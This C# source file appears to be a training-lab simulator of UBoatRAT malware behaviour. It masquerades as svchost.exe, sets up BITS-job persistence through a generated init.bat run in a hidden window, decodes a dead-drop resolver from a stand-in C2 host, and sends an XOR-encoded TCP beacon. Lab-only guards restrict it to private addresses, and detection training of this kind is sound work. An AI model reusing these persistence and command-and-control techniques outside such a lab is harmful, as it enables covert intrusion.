using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;

namespace UBoatRATLab
{
    internal static class Program
    {
        /*
         * BENIGN EDUCATIONAL SIMULATOR
         *
         * This program does not implement a RAT, command execution,
         * file exfiltration, remote administration, credential access,
         * reconnaissance, or a remotely controlled command channel.
         *
         * It reproduces a restricted set of observable UBoatRAT-style
         * artefacts for an isolated cybersecurity training lab:
         *
         *   1. A suspiciously named executable outside System32.
         *   2. An init.bat file that registers a BITS job.
         *   3. A BITS SetNotifyCmdLine callback.
         *   4. Retrieval of a controlled dead-drop resolver.
         *   5. A one-shot, fixed, non-interactive TCP beacon.
         *
         * Multiple safety controls prevent the simulator from being used
         * outside the prepared lab environment.
         */

        private const string LabRoot =
            @"C:\ProgramData\UBoatRAT_Lab";

        private const string InstalledCopy =
            @"C:\ProgramData\UBoatRAT_Lab\svchost.exe";

        private const string InitBatch =
            @"C:\ProgramData\UBoatRAT_Lab\init.bat";

        private const string LabMarkerName =
            "UBoatRAT_LAB.marker";

        private const string InstalledMarker =
            @"C:\ProgramData\UBoatRAT_Lab\UBoatRAT_LAB.marker";

        private const string CallbackLog =
            @"C:\ProgramData\UBoatRAT_Lab\callback.log";

        private const string ExecutionLog =
            @"C:\ProgramData\UBoatRAT_Lab\execution.log";

        private const string ResolverEvidence =
            @"C:\ProgramData\UBoatRAT_Lab\resolver_response.txt";

        private const string BeaconMarker =
            @"C:\ProgramData\UBoatRAT_Lab\beacon.sent";

        private const string JobName =
            "UBoatLab_Persistence";

        /*
         * The resolver hostname is fixed.
         * lab_start.ps1 maps it to the private Ubuntu VM IP.
         */
        private const string ResolverHost =
            "uboat-c2.test";

        private const string TriggerUrl =
            "http://uboat-c2.test:8080/c2/trigger.dat";

        private const string ResolverUrl =
            "http://uboat-c2.test:8080/resolver/README.md";

        /*
         * The TCP destination port cannot be changed by the resolver.
         */
        private const int BeaconPort = 9001;

        /*
         * Static beacon only. No hostname, username, files, credentials,
         * commands, environment data, or user information are collected.
         */
        private const string BeaconText =
            "488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL";

        private const byte XorKey = 0x88;

        [STAThread]
        private static void Main(string[] args)
        {
            try
            {
                if (args != null &&
                    args.Length == 1 &&
                    string.Equals(
                        args[0],
                        "--bits-callback",
                        StringComparison.OrdinalIgnoreCase))
                {
                    RunBitsCallback();
                    return;
                }

                RunInitialStage();
            }
            catch (Exception ex)
            {
                WriteEmergencyLog(ex);
            }
        }

        private static void RunInitialStage()
        {
            /*
             * Safety control 1:
             * Refuse to run unless the setup script placed a lab marker
             * next to the original executable.
             */
            string sourceDirectory =
                AppDomain.CurrentDomain.BaseDirectory;

            string sourceMarker =
                Path.Combine(sourceDirectory, LabMarkerName);

            if (!File.Exists(sourceMarker))
            {
                WriteBlockedLog(
                    "Execution blocked: UBoatRAT_LAB.marker was not found " +
                    "next to the executable.");

                return;
            }

            /*
             * Safety control 2:
             * The fixed lab hostname must resolve to an RFC1918 private
             * IPv4 address before any BITS job or network activity occurs.
             */
            IPAddress resolverAddress;

            if (!TryResolvePrivateAddress(
                    ResolverHost,
                    out resolverAddress))
            {
                WriteBlockedLog(
                    "Execution blocked: " + ResolverHost +
                    " did not resolve to an RFC1918 private IPv4 address.");

                return;
            }

            Directory.CreateDirectory(LabRoot);

            WriteLog(
                ExecutionLog,
                "Initial laboratory stage started.");

            WriteLog(
                ExecutionLog,
                "Resolver validated as private address: " +
                resolverAddress);

            string currentExecutable =
                Process.GetCurrentProcess().MainModule.FileName;

            /*
             * Prevent accidental recursive installation when someone
             * launches the copied file manually without --bits-callback.
             */
            if (PathsEqual(currentExecutable, InstalledCopy))
            {
                WriteLog(
                    ExecutionLog,
                    "Installed copy was launched without --bits-callback. " +
                    "No action was performed.");

                return;
            }

            /*
             * Reproduce the suspicious naming artefact while keeping every
             * file inside the clearly labelled laboratory directory.
             */
            File.Copy(
                currentExecutable,
                InstalledCopy,
                true);

            File.Copy(
                sourceMarker,
                InstalledMarker,
                true);

            WriteLog(
                ExecutionLog,
                "Simulator copied to: " + InstalledCopy);

            CreateInitBatch();
            LaunchInitBatch();

            WriteLog(
                ExecutionLog,
                "BITS bootstrap was launched through init.bat.");

            WriteLog(
                ExecutionLog,
                "Initial stage finished.");
        }

        private static void CreateInitBatch()
        {
            string tempDirectory =
                Path.GetTempPath().TrimEnd(
                    Path.DirectorySeparatorChar,
                    Path.AltDirectorySeparatorChar);

            string triggerDestination =
                Path.Combine(
                    tempDirectory,
                    "uboat_lab_trigger.dat");

            /*
             * The original malware deleted init.bat after running it.
             * This benign version deliberately preserves it so the student
             * can inspect the artefact during the investigation.
             *
             * The BITS job downloads only a harmless trigger file.
             * Its notification command starts this simulator in the fixed
             * --bits-callback mode.
             */
            string[] batchLines =
            {
                "@echo off",
                "rem ======================================================",
                "rem BENIGN UBoatRAT laboratory simulation",
                "rem No malware or remote command channel is implemented.",
                "rem This file is intentionally preserved for analysis.",
                "rem ======================================================",
                "",
                "bitsadmin /cancel \"" + JobName +
                    "\" >nul 2>&1",
                "",
                "bitsadmin /create /download \"" +
                    JobName + "\"",
                "",
                "bitsadmin /addfile \"" +
                    JobName + "\" \"" +
                    TriggerUrl + "\" \"" +
                    triggerDestination + "\"",
                "",
                "bitsadmin /setnotifycmdline \"" +
                    JobName + "\" \"" +
                    InstalledCopy + "\" \"" +
                    InstalledCopy +
                    " --bits-callback\"",
                "",
                "bitsadmin /resume \"" +
                    JobName + "\"",
                "",
                "exit /b 0"
            };

            File.WriteAllLines(
                InitBatch,
                batchLines,
                Encoding.ASCII);

            WriteLog(
                ExecutionLog,
                "Created BITS bootstrap script: " +
                InitBatch);
        }

        private static void LaunchInitBatch()
        {
            ProcessStartInfo startInfo =
                new ProcessStartInfo();

            startInfo.FileName = "cmd.exe";
            startInfo.Arguments =
                "/d /c \"" + InitBatch + "\"";

            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle =
                ProcessWindowStyle.Hidden;

            Process process =
                Process.Start(startInfo);

            if (process == null)
            {
                throw new InvalidOperationException(
                    "cmd.exe could not be started.");
            }
        }

        private static void RunBitsCallback()
        {
            Directory.CreateDirectory(LabRoot);

            WriteLog(
                CallbackLog,
                "BITS callback process started.");

            /*
             * Safety control 3:
             * Only a copy installed by the prepared lab may execute the
             * callback stage.
             */
            if (!File.Exists(InstalledMarker))
            {
                WriteLog(
                    CallbackLog,
                    "Callback blocked: installed lab marker is missing.");

                return;
            }

            /*
             * Safety control 4:
             * Permit only one successful beacon per snapshot/session.
             */
            if (File.Exists(BeaconMarker))
            {
                WriteLog(
                    CallbackLog,
                    "One-shot beacon already sent. No network activity " +
                    "was performed.");

                return;
            }

            IPAddress resolverAddress;

            if (!TryResolvePrivateAddress(
                    ResolverHost,
                    out resolverAddress))
            {
                WriteLog(
                    CallbackLog,
                    "Callback blocked: resolver does not point to a " +
                    "private IPv4 address.");

                return;
            }

            string resolverContent =
                DownloadResolver();

            File.WriteAllText(
                ResolverEvidence,
                resolverContent,
                Encoding.UTF8);

            IPAddress targetAddress;
            int targetPort;

            if (!TryParseResolver(
                    resolverContent,
                    out targetAddress,
                    out targetPort))
            {
                WriteLog(
                    CallbackLog,
                    "Resolver parsing failed. No beacon was sent.");

                return;
            }

            /*
             * Safety control 5:
             * The decoded target must be the exact same private host as the
             * HTTP resolver, and the destination port is fixed to 9001.
             *
             * The resolver therefore cannot redirect the simulator toward
             * another machine.
             */
            if (!targetAddress.Equals(resolverAddress))
            {
                WriteLog(
                    CallbackLog,
                    "Callback blocked: decoded target does not match " +
                    "the resolver host.");

                return;
            }

            if (targetPort != BeaconPort)
            {
                WriteLog(
                    CallbackLog,
                    "Callback blocked: decoded port is not the fixed " +
                    "laboratory port 9001.");

                return;
            }

            SendOneShotBeacon(
                targetAddress,
                targetPort);

            File.WriteAllText(
                BeaconMarker,
                "A single benign beacon was sent at " +
                DateTime.UtcNow.ToString("O") +
                Environment.NewLine,
                Encoding.ASCII);

            WriteLog(
                CallbackLog,
                "One-shot benign beacon sent successfully.");

            WriteLog(
                CallbackLog,
                "No response was read and no command channel was opened.");
        }

        private static string DownloadResolver()
        {
            WriteLog(
                CallbackLog,
                "Requesting controlled resolver: " +
                ResolverUrl);

            using (TimeoutWebClient client =
                new TimeoutWebClient(5000))
            {
                client.Proxy = null;

                client.Headers[
                    HttpRequestHeader.UserAgent] =
                    "UBoatRAT-Lab-Simulator/1.0";

                return client.DownloadString(
                    ResolverUrl);
            }
        }

        private static bool TryParseResolver(
            string resolverContent,
            out IPAddress targetAddress,
            out int targetPort)
        {
            targetAddress = null;
            targetPort = 0;

            if (string.IsNullOrWhiteSpace(
                    resolverContent))
            {
                return false;
            }

            /*
             * Expected format:
             *
             * [Rudeltaktik]<BASE64_ENCODED_PRIVATE_IP_AND_PORT>!
             *
             * Decoded example:
             *
             * 10.10.20.15:9001
             */
            Match match = Regex.Match(
                resolverContent,
                @"\[Rudeltaktik\](?<value>[A-Za-z0-9+/=]+)!",
                RegexOptions.CultureInvariant);

            if (!match.Success)
            {
                return false;
            }

            string encodedValue =
                match.Groups["value"].Value;

            string decodedValue;

            try
            {
                byte[] decodedBytes =
                    Convert.FromBase64String(
                        encodedValue);

                decodedValue =
                    Encoding.ASCII.GetString(
                        decodedBytes);
            }
            catch
            {
                return false;
            }

            int separatorIndex =
                decodedValue.LastIndexOf(':');

            if (separatorIndex <= 0 ||
                separatorIndex >=
                    decodedValue.Length - 1)
            {
                return false;
            }

            string addressText =
                decodedValue.Substring(
                    0,
                    separatorIndex);

            string portText =
                decodedValue.Substring(
                    separatorIndex + 1);

            IPAddress parsedAddress;
            int parsedPort;

            if (!IPAddress.TryParse(
                    addressText,
                    out parsedAddress))
            {
                return false;
            }

            if (!int.TryParse(
                    portText,
                    out parsedPort))
            {
                return false;
            }

            if (!IsPrivateIpv4(parsedAddress))
            {
                return false;
            }

            if (parsedPort != BeaconPort)
            {
                return false;
            }

            targetAddress = parsedAddress;
            targetPort = parsedPort;

            WriteLog(
                CallbackLog,
                "Resolver decoded private endpoint: " +
                targetAddress + ":" +
                targetPort);

            return true;
        }

        private static void SendOneShotBeacon(
            IPAddress address,
            int port)
        {
            byte[] plaintext =
                Encoding.ASCII.GetBytes(
                    BeaconText);

            byte[] encoded =
                new byte[plaintext.Length];

            for (int index = 0;
                 index < plaintext.Length;
                 index++)
            {
                encoded[index] =
                    (byte)(plaintext[index] ^ XorKey);
            }

            using (TcpClient client =
                new TcpClient(
                    AddressFamily.InterNetwork))
            {
                IAsyncResult connectResult =
                    client.BeginConnect(
                        address,
                        port,
                        null,
                        null);

                bool connected =
                    connectResult.AsyncWaitHandle.WaitOne(
                        TimeSpan.FromSeconds(5));

                if (!connected)
                {
                    client.Close();

                    throw new TimeoutException(
                        "The TCP laboratory listener did not respond.");
                }

                client.EndConnect(connectResult);

                client.SendTimeout = 5000;
                client.ReceiveTimeout = 5000;

                using (NetworkStream stream =
                    client.GetStream())
                {
                    stream.Write(
                        encoded,
                        0,
                        encoded.Length);

                    stream.Flush();

                    /*
                     * Deliberately do not read a response.
                     * This simulator cannot receive commands.
                     */
                }
            }

            WriteLog(
                CallbackLog,
                "Sent " + encoded.Length +
                " XOR-encoded bytes to the fixed lab listener.");
        }

        private static bool TryResolvePrivateAddress(
            string hostname,
            out IPAddress privateAddress)
        {
            privateAddress = null;

            try
            {
                IPAddress[] addresses =
                    Dns.GetHostAddresses(hostname);

                foreach (IPAddress address in addresses)
                {
                    if (IsPrivateIpv4(address))
                    {
                        privateAddress = address;
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }

            return false;
        }

        private static bool IsPrivateIpv4(
            IPAddress address)
        {
            if (address == null ||
                address.AddressFamily !=
                    AddressFamily.InterNetwork)
            {
                return false;
            }

            byte[] bytes =
                address.GetAddressBytes();

            /*
             * RFC1918 ranges only:
             *
             * 10.0.0.0/8
             * 172.16.0.0/12
             * 192.168.0.0/16
             */
            if (bytes[0] == 10)
            {
                return true;
            }

            if (bytes[0] == 172 &&
                bytes[1] >= 16 &&
                bytes[1] <= 31)
            {
                return true;
            }

            if (bytes[0] == 192 &&
                bytes[1] == 168)
            {
                return true;
            }

            return false;
        }

        private static bool PathsEqual(
            string firstPath,
            string secondPath)
        {
            string normalizedFirst =
                Path.GetFullPath(firstPath)
                    .TrimEnd(
                        Path.DirectorySeparatorChar,
                        Path.AltDirectorySeparatorChar);

            string normalizedSecond =
                Path.GetFullPath(secondPath)
                    .TrimEnd(
                        Path.DirectorySeparatorChar,
                        Path.AltDirectorySeparatorChar);

            return string.Equals(
                normalizedFirst,
                normalizedSecond,
                StringComparison.OrdinalIgnoreCase);
        }

        private static void WriteLog(
            string logPath,
            string message)
        {
            try
            {
                Directory.CreateDirectory(
                    Path.GetDirectoryName(logPath));

                string line =
                    "[" +
                    DateTime.UtcNow.ToString("O") +
                    "] " +
                    message +
                    Environment.NewLine;

                File.AppendAllText(
                    logPath,
                    line,
                    Encoding.UTF8);
            }
            catch
            {
                /*
                 * Logging failure must never trigger additional behavior.
                 */
            }
        }

        private static void WriteBlockedLog(
            string message)
        {
            try
            {
                string blockedLog =
                    Path.Combine(
                        Path.GetTempPath(),
                        "UBoatRAT_Lab_Blocked.log");

                File.AppendAllText(
                    blockedLog,
                    "[" +
                    DateTime.UtcNow.ToString("O") +
                    "] " +
                    message +
                    Environment.NewLine,
                    Encoding.UTF8);
            }
            catch
            {
                // Fail closed and silently.
            }
        }

        private static void WriteEmergencyLog(
            Exception exception)
        {
            try
            {
                Directory.CreateDirectory(
                    LabRoot);

                WriteLog(
                    Path.Combine(
                        LabRoot,
                        "error.log"),
                    exception.ToString());
            }
            catch
            {
                // Fail closed and silently.
            }
        }

        private sealed class TimeoutWebClient :
            WebClient
        {
            private readonly int timeoutMilliseconds;

            public TimeoutWebClient(
                int timeoutMilliseconds)
            {
                this.timeoutMilliseconds =
                    timeoutMilliseconds;
            }

            protected override WebRequest GetWebRequest(
                Uri address)
            {
                WebRequest request =
                    base.GetWebRequest(address);

                if (request != null)
                {
                    request.Timeout =
                        timeoutMilliseconds;

                    HttpWebRequest httpRequest =
                        request as HttpWebRequest;

                    if (httpRequest != null)
                    {
                        httpRequest.ReadWriteTimeout =
                            timeoutMilliseconds;

                        httpRequest.AllowAutoRedirect =
                            false;
                    }
                }

                return request;
            }
        }
    }
}
